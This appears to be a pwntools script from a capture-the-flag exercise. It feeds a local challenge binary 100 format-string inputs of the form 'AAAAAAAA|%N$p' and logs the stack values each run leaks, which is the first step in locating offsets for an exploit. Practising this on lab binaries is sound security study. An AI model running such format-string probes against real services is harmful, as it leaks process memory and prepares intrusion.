from pwn import *
elf = context.binary = ELF("./chall_patched")
for i in range(100):
    p = process()
    p.sendline(f"AAAAAAAA|%{i}$p")
    p.recvuntil(b"input: ")
    log.info(f"Ke {i}: {p.recvline()}")
    p.close()